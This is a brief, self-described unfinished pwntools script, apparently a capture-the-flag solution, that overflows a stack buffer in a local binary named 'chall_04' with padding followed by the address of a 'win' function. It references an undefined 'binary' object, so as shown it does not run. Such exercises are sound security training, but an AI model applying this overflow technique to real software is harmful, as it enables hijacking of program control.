from pwn import * 
p = process("./chall_04")
p.recv()
payload  = b''
payload += ((0x60 - 0x8) * b'A' + p64(binary.sym.win))
p.sendline(payload)

# NOT FINISHED
